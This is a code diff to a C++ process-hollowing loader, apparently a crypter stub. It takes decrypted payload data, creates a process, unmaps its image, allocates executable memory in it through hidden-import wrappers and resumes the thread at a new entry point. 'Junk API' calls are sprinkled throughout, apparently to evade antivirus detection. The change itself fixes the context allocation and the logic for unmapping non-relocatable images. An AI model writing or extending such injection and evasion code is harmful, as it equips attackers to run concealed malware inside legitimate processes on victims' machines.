@@ -11,6 +11,7 @@ dynamicFork::dynamicFork(char* decryptedData) {
 	}
 	catch (std::runtime_error& e) {
 		std::cerr << e.what() << std::endl;
+		//TerminateProcess(this->Process.processInfo->hProcess, -1);
 	}
 }
 
@@ -47,8 +48,7 @@ void dynamicFork::CreateProcessAndWrite(char* decryptedData) {
 		//Junk API
 		JunkGetParent();
 
-		//AllocateContext();
-		context->ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER;
+		AllocateContext();
 
 		//Junk API
 		JunkGetMenu();
@@ -76,9 +76,9 @@ void dynamicFork::CreateProcessAndWrite(char* decryptedData) {
 			//Junk API
 			JunkAtomSTR();
 
+
 			SetBaseAddressAndEntryPoint();
 	
-
 			SetContextAndResumeThread();
 
 		}
@@ -92,11 +92,11 @@ void dynamicFork::CreateProcessAndWrite(char* decryptedData) {
 }
 
 
-/*void dynamicFork::AllocateContext() {
+void dynamicFork::AllocateContext() {
 
 	context = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
 	context->ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER;
-}*/
+}
 
 void dynamicFork::GetBaseAddrOfNewProcess() {
 
@@ -119,7 +119,7 @@ void dynamicFork::GetBaseAddrOfNewProcess() {
 			imageBase = hiddenImp::EvVirtualAllocEx(this->Process.processInfo->hProcess, dwCurrentImageBase, this->Headers.peHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 			if (!imageBase)
 			{
-				throw(std::runtime_error("[-] Error allocating."));
+				throw(std::runtime_error("[-] Error allocating. [1]"));
 			}
 		}
 		else
@@ -128,21 +128,33 @@ void dynamicFork::GetBaseAddrOfNewProcess() {
 			imageBase = hiddenImp::EvVirtualAllocEx(this->Process.processInfo->hProcess, NULL, this->Headers.peHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 			if (!imageBase)
 			{
-				throw(std::runtime_error("[-] Error allocating."));
+				throw(std::runtime_error("[-] Error allocating. [2]"));
 			}
 		}
 	}
 	else
 	{
-		//Image not relocatable so we can load in the same address.
+		if (!hiddenImp::EvNtUnmapViewOfSection(this->Process.processInfo->hProcess, dwCurrentImageBase))
+		{
+			imageBase = hiddenImp::EvVirtualAllocEx(this->Process.processInfo->hProcess, dwCurrentImageBase, this->Headers.peHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			if (!imageBase)
+			{
+				throw(std::runtime_error("[-] Error allocating. [3]"));
+
+			}
+		}
+		/*
+		//Image not relocatable
 		if ((DWORD)dwCurrentImageBase >= this->Headers.peHeader->OptionalHeader.ImageBase && (DWORD)dwCurrentImageBase <= (this->Headers.peHeader->OptionalHeader.ImageBase + this->Headers.peHeader->OptionalHeader.SizeOfImage)) {
+
+			//Process current image base is allocated in between of executable image so we have to unmap
 			if (!hiddenImp::EvNtUnmapViewOfSection(this->Process.processInfo->hProcess, (PVOID)(this->Headers.peHeader->OptionalHeader.ImageBase)))
 			{
 
 				imageBase = hiddenImp::EvVirtualAllocEx(this->Process.processInfo->hProcess, (PVOID)(this->Headers.peHeader->OptionalHeader.ImageBase), this->Headers.peHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 				if (!imageBase)
 				{
-					throw(std::runtime_error("[-] Error allocating."));
+					throw(std::runtime_error("[-] Error allocating. [3]"));
 
 				}
 			}
@@ -151,10 +163,11 @@ void dynamicFork::GetBaseAddrOfNewProcess() {
 			imageBase = hiddenImp::EvVirtualAllocEx(this->Process.processInfo->hProcess, (PVOID)(this->Headers.peHeader->OptionalHeader.ImageBase), this->Headers.peHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 			if (!imageBase)
 			{
-				throw(std::runtime_error("[-] Error allocating."));
+				throw(std::runtime_error("[-] Error allocating. [4]"));
 
 			}
 		}
+		*/
 	}
 
 }
